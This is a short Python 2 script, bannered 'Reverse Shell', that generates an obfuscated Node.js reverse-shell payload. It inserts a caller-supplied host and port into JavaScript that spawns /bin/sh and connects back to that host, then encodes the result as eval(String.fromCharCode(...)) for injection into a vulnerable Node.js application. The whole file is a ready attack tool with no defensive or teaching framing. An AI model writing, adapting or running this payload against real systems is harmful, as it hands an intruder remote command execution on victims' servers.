import sys
print """

                       ##            ##
                       ##
        # ##   ###   ####  ###     ####  ####
        ## ## ## ## ## ## ## ##      ## ##
        ## ## ## ## ## ## ## ##      ## ####
        ## ## ## ## ## ## #####      ##  ####
        ## ## ## ## ## ## ##    ##   ##    ##
        ## ##  ###   ## #  #### ##   ## ####
                                     ##
                                   ###
                 Reverse Shell
"""
if len(sys.argv) != 3:
    print "Usage: %s <local_host> <listener_port>" %(sys.argv[0])
    sys.exit(0)

ip = sys.argv[1]
port = sys.argv[2]

def encoder(string):
    encoded=''
    for char in string:
        encoded=encoded+","+str(ord(char))
    return encoded[1:]

print "[*] local_host = %s" %(ip)
print "[*] listener_port = %s" %(port)
node_js_exploit_code = """var net = require('net'),util = require('util'),spawn = require('child_process').spawn,sh = spawn('/bin/sh',[]);HOST="localhost";PORT="listener_port";TIMEOUT="5000";function c(HOST,PORT) {    var client = new net.Socket();    client.connect(PORT, HOST, function() {        client.write("Execute command: ");        client.pipe(sh.stdin);        util.pump(sh.stdout,client);    });    client.on('error', function(e) {        setTimeout(c(HOST,PORT), TIMEOUT);    });} c(HOST,PORT);"""
node_js_exploit_code = node_js_exploit_code.replace('localhost', ip)
node_js_exploit_code = node_js_exploit_code.replace('listener_port', port)
print "[!] Encoding payload"
payload = encoder(node_js_exploit_code)
exploit = "eval(String.fromCharCode(%s))" %(payload)
print exploit
